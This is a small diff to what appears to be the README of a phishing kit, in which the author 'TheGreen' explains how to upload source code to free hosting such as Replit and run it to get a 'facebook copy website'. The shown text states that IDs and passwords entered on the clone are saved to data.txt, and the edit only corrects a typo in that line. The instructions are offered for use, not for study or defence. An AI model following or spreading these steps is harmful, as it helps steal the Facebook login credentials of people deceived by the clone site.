@@ -7,7 +7,7 @@ Step 2: go to free web hosting like replit ;
 Step 3: upload sourse code file and run it
 
 
-  < Now you have a facebook copy website and if some inputs there the id and pass will come to your file data.txt >
+  < Now you have a facebook copy website and if someone inputs there the id and pass will come to your file data.txt >
 
 
                                               THANKYOU    -- TheGreen
